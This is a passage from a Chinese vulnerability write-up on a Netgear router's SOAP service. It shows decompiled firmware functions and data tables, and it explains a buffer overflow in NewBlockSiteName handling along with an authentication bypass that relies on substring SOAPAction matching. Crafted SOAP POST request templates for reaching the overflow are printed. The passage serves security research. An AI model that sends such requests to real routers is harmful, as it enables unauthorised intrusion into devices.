class="comment">// (3) 对应标签NewBlockSiteName</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( buf )</span><br><span class="line">      &#123;</span><br><span class="line">        dword_D96CC[<span class="number">19</span> * v71] = <span class="number">0xFF37</span>;</span><br><span class="line">        <span class="keyword">return</span> sa_setBlockName(src, (<span class="keyword">int</span>)buf);</span><br><span class="line">      <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">; 标签名称和索引(类型?)表</span><br><span class="line">.data:0007DA44 dword_7DA44     DCD 0xFF00                                                 </span><br><span class="line">.data:0007DA48 off_7DA48       DCD aNewenable          ; &quot;NewEnable&quot;</span><br><span class="line">.data:0007DA4C dword_7DA4C     DCD 1                              </span><br><span class="line">; ...</span><br><span class="line">.data:0007DCE4                 DCD 0xFF37</span><br><span class="line">.data:0007DCE8                 DCD aNewblocksitena     ; &quot;NewBlockSiteName&quot;</span><br><span class="line">.data:0007DCEC                 DCD 0x3E8</span><br></pre></td></tr></table></figure><h5 id="sa-processResponse-函数"><a href="#sa-processResponse-函数" class="headerlink" title="sa_processResponse()函数"></a><code>sa_processResponse()</code>函数</h5><p>在<code>sa_processResponse()</code>函数内，在<code>(1)</code>处根据<code>soap_action</code>的类型进入不同的处理分支，在<code>case 0</code>中有多处(<code>SetDeviceNameIconByMAC</code>，<code>SetDeviceInfoByMAC</code>，<code>SetNetgearDeviceName</code>)会跳到分支<code>LABEL_184</code>，满足一定条件后在<code>(2)</code>处会调用<code>sa_parseRcvCmd()</code>，同样<code>case 1</code>中也有多处会跳到<code>LABEL_184</code>分支，之后会调用<code>sa_parseRcvCmd()</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sa_processResponse</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> *a2, <span class="keyword">int</span> a3, <span class="keyword">signed</span> <span class="keyword">int</span> a4, <span class="keyword">char</span> *a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v5 = (<span class="keyword">void</span> *)a1; v6 = a2;</span><br><span class="line">  <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5 )  <span class="comment">// (1) soap action type</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0u</span>:  <span class="comment">// 对应service：DeviceInfo</span></span><br><span class="line">      <span class="keyword">if</span> ( sa_findKeyword((<span class="keyword">int</span>)v6, <span class="number">0</span>) == <span class="number">1</span> ) <span class="comment">// GetInfo</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_241;</span><br><span class="line">      <span class="keyword">if</span> ( sa_findKeyword((<span class="keyword">int</span>)v6, <span class="number">0xB1</span>) == <span class="number">1</span> ) <span class="comment">// SetDeviceNameIconByMAC</span></span><br><span class="line">      &#123; v12 = <span class="number">177</span>; <span class="keyword">goto</span> LABEL_184; &#125;</span><br><span class="line">      <span class="keyword">if</span> ( sa_findKeyword((<span class="keyword">int</span>)v6, <span class="number">0xB9</span>) == <span class="number">1</span> ) <span class="comment">// SetDeviceInfoByMAC</span></span><br><span class="line">      &#123; v12 = <span class="number">185</span>; <span class="keyword">goto</span> LABEL_184; &#125;</span><br><span class="line">      <span class="keyword">if</span> ( sa_findKeyword((<span class="keyword">int</span>)v6, <span class="number">0xBA</span>) == <span class="number">1</span> ) <span class="comment">// SetNetgearDeviceName</span></span><br><span class="line">      &#123; v12 = <span class="number">186</span>; <span class="keyword">goto</span> LABEL_184; &#125;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">1u</span>:  <span class="comment">// 对应service：DeviceConfig</span></span><br><span class="line">      <span class="keyword">if</span> ( sa_findKeyword((<span class="keyword">int</span>)v6, <span class="number">0xB8</span>) == <span class="number">1</span> ) <span class="comment">// SOAPLogin</span></span><br><span class="line">      &#123; v10 = <span class="number">184</span>; v11 = <span class="number">-1</span>; <span class="keyword">goto</span> LABEL_242; &#125;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      <span class="keyword">if</span> ( sa_findKeyword((<span class="keyword">int</span>)v6, <span class="number">0xB6</span>) == <span class="number">1</span> ) <span class="comment">// RecoverAdminPassword</span></span><br><span class="line">      &#123; v12 = <span class="number">182</span>; <span class="keyword">goto</span> LABEL_184; &#125;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">7u</span>:  <span class="comment">// 对应service：ParentalControl</span></span><br><span class="line">      <span class="keyword">if</span> ( sa_findKeyword((<span class="keyword">int</span>)v6, <span class="number">71</span>) == <span class="number">1</span> ) <span class="comment">// GetAllMACAddresses</span></span><br><span class="line">      &#123; v10 = <span class="number">71</span>; v11 = <span class="number">-1</span>; <span class="keyword">goto</span> LABEL_242; &#125;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">LABEL_184:</span><br><span class="line">      wrap_vprintf(<span class="number">3</span>, <span class="string">&quot;%s()\n&quot;</span>, <span class="string">&quot;sa_checkSessionID&quot;</span>);</span><br><span class="line">      v13 = <span class="built_in">strstr</span>(v6, <span class="string">&quot;SessionID&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v13 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_759;</span><br><span class="line">      v14 = v13 + <span class="number">9</span>; v15 = <span class="built_in">strchr</span>(v13 + <span class="number">9</span>, <span class="number">62</span>); v16 = <span class="built_in">strstr</span>(v14, <span class="string">&quot;&lt;/&quot;</span>);</span><br><span class="line">      v17 = v15 == <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v15 )</span><br><span class="line">        v17 = v16 == <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v17</span><br><span class="line">        &amp;&amp; ((v18 = v15 + <span class="number">1</span>, v16 &gt;= v15 + <span class="number">1</span>) ? (v19 = v16 - (_BYTE *)v18) : (v19 = (_BYTE *)v18 - v16), v19 &lt;= <span class="number">0x27</span>) )</span><br><span class="line">      &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v12 != <span class="number">0x2D</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v12 == <span class="number">0x4E</span> )</span><br><span class="line">        &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v12 != <span class="number">0x5C</span> )</span><br><span class="line">          &#123;</span><br><span class="line">LABEL_196:</span><br><span class="line">            v8 = sa_parseRcvCmd(v6, v75);  <span class="comment">// (2)</span></span><br><span class="line">            <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>其中，<code>sa_findKeyword()</code>函数主要是根据指定的<code>index</code>在表中查找对应的<code>keyword</code>，对应表的部分内容如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.data:0007D47C dword_7D47C     DCD 0                   </span><br><span class="line">.data:0007D480                 DCD aGetinfo            ; &quot;GetInfo&quot;</span><br><span class="line">; ...</span><br><span class="line">.data:0007D9EC                 DCD 0xB1</span><br><span class="line">.data:0007D9F0                 DCD aSetdevicenamei     ; &quot;SetDeviceNameIconByMAC&quot;</span><br><span class="line">; ...</span><br><span class="line">.data:0007DA14                 DCD 0xB9</span><br><span class="line">.data:0007DA18                 DCD aSetdeviceinfob     ; &quot;SetDeviceInfoByMAC&quot;</span><br><span class="line">; ...</span><br><span class="line">.data:0007DA1C                 DCD 0xBA</span><br><span class="line">.data:0007DA20                 DCD aSetnetgeardevi     ; &quot;SetNetgearDeviceName&quot;</span><br><span class="line">; ...</span><br><span class="line">.data:0007DA2C                 DCD 0xB6</span><br><span class="line">.data:0007DA30                 DCD aRecoveradminpa     ; &quot;RecoverAdminPassword&quot;</span><br><span class="line">; ...</span><br><span class="line">.data:0007DA34                 DCD 0xB8</span><br><span class="line">.data:0007DA38                 DCD aSoaplogin          ; &quot;SOAPLogin&quot;</span><br></pre></td></tr></table></figure><p>综上，通过构造如下所示的<code>SOAP</code>消息，即可到达漏洞点。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SOAP-ENV:Envelope</span> <span class="attr">xmlns:SOAP-ENV</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="attr">SOAP-ENV:encodingStyle</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SOAP-ENV:Body</span>&gt;</span></span><br><span class="line">SetNetgearDeviceName		// SetDeviceNameIconByMAC 或 SetDeviceInfoByMAC 也行</span><br><span class="line"><span class="tag">&lt;<span class="name">NewBlockSiteName</span>&gt;</span>123</span><br><span class="line"><span class="tag">&lt;/<span class="name">NewBlockSiteName</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SOAP-ENV:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SOAP-ENV:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="认证绕过"><a href="#认证绕过" class="headerlink" title="认证绕过"></a>认证绕过</h4><p>在前面的分析中，选择通过<code>case 0</code>中的<code>SetNetgearDeviceName</code>(或<code>SetDeviceNameIconByMAC</code>、<code>SetDeviceInfoByMAC</code>)去触发漏洞，这就涉及到认证绕过漏洞了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> __fastcall <span class="title">sa_method_check</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">char</span> *a3, <span class="keyword">signed</span> <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  request_ptr = a1;   <span class="comment">// point to the start of http request</span></span><br><span class="line">  v5 = a2; v6 = a3; v7 = a4; v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = dword_8F5B8;</span><br><span class="line">  LOBYTE(dword_BFEC4) = <span class="number">0</span>;</span><br><span class="line">  *(_WORD *)((<span class="keyword">char</span> *)&amp;dword_BFEC4 + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">  HIBYTE(dword_BFEC4) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( dword_8F5B8 == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> sub_2BCE0(<span class="number">0x20000</span>, aXmlVersion10En_87, v5, v9);</span><br><span class="line">  v11 = stristr(request_ptr, aSoapaction_0);    <span class="comment">// (1) 查找&quot;SOAPAction:&quot;</span></span><br><span class="line">  <span class="keyword">if</span> ( !v11 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v12 = aDeviceinfo;</span><br><span class="line">  v13 = (<span class="keyword">const</span> <span class="keyword">char</span> *)(v11 + <span class="built_in">strlen</span>(aSoapaction_0));</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )  <span class="comment">// (2) 在表中查找具体的SOAPAction操作, 并获取对应的soap_action type</span></span><br><span class="line">  &#123;</span><br><span class="line">    v14 = v12; dword_9DCF4 = (<span class="keyword">int</span>)v12; v12 += <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">if</span> ( stristr(v13, v14) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ++v8 == <span class="number">11</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      soap_action_index = <span class="number">-1</span>; <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  soap_action_index = v8;</span><br><span class="line">LABEL_10:</span><br><span class="line">  <span class="comment">// ...  </span></span><br><span class="line">  v19 = (<span class="keyword">const</span> <span class="keyword">char</span> *)stristr(request_ptr, <span class="string">&quot;Cookie:&quot;</span>);</span><br><span class="line">  v20 = (<span class="keyword">const</span> <span class="keyword">char</span> *)stristr(request_ptr, <span class="string">&quot;SOAPAction:&quot;</span>);</span><br><span class="line">  v21 = (<span class="keyword">size_t</span>)v20;</span><br><span class="line">  v22 = <span class="built_in">strchr</span>(v20, <span class="string">&#x27;\r&#x27;</span>);</span><br><span class="line">  *v22 = v18; v23 = v21; n = v22;</span><br><span class="line">  v24 = stristr(v23, <span class="string">&quot;service:DeviceConfig:1#SOAPLogin&quot;</span>) == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v19 )</span><br><span class="line">    v24 = <span class="number">0</span>;</span><br><span class="line">  *n = <span class="number">13</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v24 || (v25 = <span class="built_in">strchr</span>(v19, <span class="string">&#x27;\r&#x27;</span>), (v87 = v25) == <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_52:</span><br><span class="line">    <span class="built_in">strncpy</span>((<span class="keyword">char</span> *)&amp;unk_D9050, <span class="string">&quot;&quot;</span>, <span class="number">0x13</span>u);</span><br><span class="line">    v44 = inet_ntoa((struct in_addr)v6);</span><br><span class="line">    <span class="built_in">strncpy</span>((<span class="keyword">char</span> *)&amp;unk_D9050, v44, <span class="number">0x13</span>u);</span><br><span class="line">    v45 = inet_ntoa((struct in_addr)v6);</span><br><span class="line">    v46 = (<span class="keyword">const</span> <span class="keyword">char</span> *)acosNvramConfig_get(<span class="string">&quot;lan_ipaddr&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v45, v46)  <span class="comment">// (3) 需保证判断条件为false</span></span><br><span class="line">      &amp;&amp; <span class="built_in">strncmp</span>(v13, <span class="string">&quot; urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate&quot;</span>, <span class="number">0x3A</span>u)</span><br><span class="line">      &amp;&amp; <span class="built_in">strncmp</span>(v13, <span class="string">&quot; \&quot;urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate\&quot;&quot;</span>, <span class="number">0x3C</span>u)</span><br><span class="line">      &amp;&amp; <span class="built_in">strncmp</span>(v13, <span class="string">&quot; urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin&quot;</span>, <span class="number">0x34</span>u)</span><br><span class="line">      &amp;&amp; <span class="built_in">strncmp</span>(v13, <span class="string">&quot; \&quot;urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin\&quot;&quot;</span>, <span class="number">0x36</span>u)</span><br><span class="line">      &amp;&amp; <span class="built_in">strncmp</span>(v13, <span class="string">&quot; urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo&quot;</span>, <span class="number">0x30</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">LABEL_27:</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)dword_9DCF4, <span class="string">&quot;ParentalControl&quot;</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">LABEL_28:</span><br><span class="line">  <span class="keyword">if</span> ( soap_action_index == <span class="number">-1</span></span><br><span class="line">    || (v31 = (<span class="keyword">const</span> <span class="keyword">char</span> *)dword_9DCF4,</span><br><span class="line">        wrap_vprintf(<span class="number">3</span>, <span class="string">&quot;%s()\n&quot;</span>, <span class="string">&quot;sa_saveXMLServiceType&quot;</span>),</span><br><span class="line">        <span class="built_in">memset</span>(byte_9FA30, <span class="number">0</span>, <span class="number">0x64</span>u),</span><br><span class="line">        (v32 = stristr(request_ptr, <span class="string">&quot;urn:&quot;</span>)) == <span class="number">0</span>)</span><br><span class="line">    || (v33 = (<span class="keyword">const</span> <span class="keyword">void</span> *)stristr(v32 + <span class="number">4</span>, <span class="string">&quot;:&quot;</span>)) == <span class="number">0</span></span><br><span class="line">    || (v34 = stristr(request_ptr, v31)) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_50:</span><br><span class="line">    v9 = <span class="number">401</span>;</span><br><span class="line">    <span class="keyword">return</span> sub_2BCE0(<span class="number">0x20000</span>, aXmlVersion10En_87, v5, v9);</span><br><span class="line">  &#125;</span><br><span class="line">  v35 = <span class="built_in">strlen</span>(v31);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_9FA30, <span class="string">&quot;urn:NETGEAR-ROUTER&quot;</span>);</span><br><span class="line">  v36 = <span class="built_in">strlen</span>(byte_9FA30);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;byte_9FA30[v36], v33, v34 + v35 - (_DWORD)v33);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_9FA30, <span class="string">&quot;:1&quot;</span>);</span><br><span class="line">  v37 = sa_processResponse(soap_action_index, request_ptr, v5, v7, v6);  <span class="comment">// (4)</span></span><br></pre></td></tr></table></figure><p>在<code>sa_method_check()</code>函数中，在<code>(1)</code>处查找<code>POST</code>请求中的<code>SOAPAction:</code>头，<code>(2)</code>处在表中查找具体的<code>SOAPAction</code>服务并获取对应的类型(索引?)，表中包含的服务名称及其顺序如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.data:0007E380 aDeviceinfo     		DCB &quot;DeviceInfo&quot;,0      </span><br><span class="line">.data:0007E39E aDeviceconfig   		DCB &quot;DeviceConfig&quot;,0</span><br><span class="line">.data:0007E3BC aWanipconnectio_0 	  DCB &quot;WANIPConnection&quot;,0</span><br><span class="line">.data:0007E3DA aWanethernetlin_0 	  DCB &quot;WANEthernetLinkConfig&quot;,0</span><br><span class="line">.data:0007E3F8 aLanconfigsecur 		DCB &quot;LANConfigSecurity&quot;,0</span><br><span class="line">.data:0007E416 aWlanconfigurat 		DCB &quot;WLANConfiguration&quot;,0</span><br><span class="line">.data:0007E434 aTime           		DCB &quot;Time&quot;,0</span><br><span class="line">.data:0007E452 aParentalcontro 		DCB &quot;ParentalControl&quot;,0</span><br><span class="line">.data:0007E470 aAdvancedqos    		DCB &quot;AdvancedQoS&quot;,0</span><br><span class="line">.data:0007E48E aUseroptionstc  		DCB &quot;UserOptionsTC&quot;,0</span><br><span class="line">.data:0007E4AC aEndOfFile_0    		DCB &quot;END_OF_FILE&quot;,0</span><br></pre></td></tr></table></figure><p>为了使得程序能执行到<code>(4)</code>，需要使得<code>(3)</code>处的判断条件不成立，即<code>SOAPAction</code>头部需包含以下三个之一。在<code>(3)</code>处还有一个对<code>ip</code>的判断，但这个似乎不太好伪造。</p><ul><li><code>urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate</code></li><li><code>urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin</code></li><li><code>urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo</code></li></ul><p>访问以上3个<code>SOAPAction</code>是无需认证的，似乎到这里直接发送如下<code>POST</code>请求就可以到达溢出漏洞点了。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">soap/server_sa/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">SOAPAction</span>: urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="line">&lt;SOAP-ENV:Body&gt;</span><br><span class="line">SetNetgearDeviceName		// SetDeviceNameIconByMAC 或 SetDeviceInfoByMAC 也行</span><br><span class="line">&lt;NewBlockSiteName&gt;123</span><br><span class="line">&lt;/NewBlockSiteName&gt;</span><br><span class="line">&lt;/SOAP-ENV:Body&gt;</span><br><span class="line">&lt;/SOAP-ENV:Envelope&gt;</span><br></pre></td></tr></table></figure><p>但是在<code>sa_processResponse()</code>函数中，在根据<code>soap_action</code>的类型进入分支处理时，<code>urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo</code>和<code>urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin</code>这2项会分别匹配对应<code>case</code> 分支的第1条<code>if</code>语句，从而跳转到其他地方，而<code>urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate</code>对应的<code>case</code>分支中的跳转都是跳到其他地方。因此，直接访问以上3个<code>SOAPAction</code>，程序执行流程不会到达溢出漏洞点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __fastcall <span class="title">sa_processResponse</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> *a2, <span class="keyword">int</span> a3, <span class="keyword">signed</span> <span class="keyword">int</span> a4, <span class="keyword">char</span> *a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  v5 = (<span class="keyword">void</span> *)a1; v6 = a2;</span><br><span class="line">  <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0u</span>:  <span class="comment">// 对应service：DeviceInfo</span></span><br><span class="line">      <span class="keyword">if</span> ( sa_findKeyword((<span class="keyword">int</span>)v6, <span class="number">0</span>) == <span class="number">1</span> ) <span class="comment">// GetInfo</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_241;  <span class="comment">// (1) &lt;=== 跳转到其他分支</span></span><br><span class="line">      <span class="keyword">if</span> ( sa_findKeyword((<span class="keyword">int</span>)v6, <span class="number">0xB1</span>) == <span class="number">1</span> ) <span class="comment">// SetDeviceNameIconByMAC</span></span><br><span class="line">      &#123; v12 = <span class="number">177</span>; <span class="keyword">goto</span> LABEL_184; &#125;</span><br><span class="line">      <span class="keyword">if</span> ( sa_findKeyword((<span class="keyword">int</span>)v6, <span class="number">0xB9</span>) == <span class="number">1</span> ) <span class="comment">// SetDeviceInfoByMAC</span></span><br><span class="line">      &#123; v12 = <span class="number">185</span>; <span class="keyword">goto</span> LABEL_184; &#125;</span><br><span class="line">      <span class="keyword">if</span> ( sa_findKeyword((<span class="keyword">int</span>)v6, <span class="number">0xBA</span>) == <span class="number">1</span> ) <span class="comment">// SetNetgearDeviceName</span></span><br><span class="line">      &#123; v12 = <span class="number">186</span>; <span class="keyword">goto</span> LABEL_184; &#125;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">1u</span>:  <span class="comment">// 对应service：DeviceConfig</span></span><br><span class="line">      <span class="keyword">if</span> ( sa_findKeyword((<span class="keyword">int</span>)v6, <span class="number">0xB8</span>) == <span class="number">1</span> ) <span class="comment">// SOAPLogin</span></span><br><span class="line">      &#123; v10 = <span class="number">184</span>; v11 = <span class="number">-1</span>; <span class="keyword">goto</span> LABEL_242; &#125;  <span class="comment">// (2) &lt;=== 跳转到其他分支</span></span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">7u</span>:  <span class="comment">// 对应service：ParentalControl</span></span><br><span class="line">      <span class="keyword">if</span> ( sa_findKeyword((<span class="keyword">int</span>)v6, <span class="number">71</span>) == <span class="number">1</span> ) <span class="comment">// GetAllMACAddresses</span></span><br><span class="line">      &#123; v10 = <span class="number">71</span>; v11 = <span class="number">-1</span>; <span class="keyword">goto</span> LABEL_242; &#125;  <span class="comment">// (3) &lt;=== 全部跳转到其他分支</span></span><br><span class="line">      <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>那么如何才到达溢出漏洞点且无需认证呢？考虑到在查找<code>SOAPAction</code>服务和<code>SOAPAction</code>对应的关键字时采用的是<code>stristr()</code>函数，即直接进行字符串匹配查找，而没有考虑字符串具体的位置，可以通过发送如下<code>POST</code>请求绕过认证并达到溢出漏洞点。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 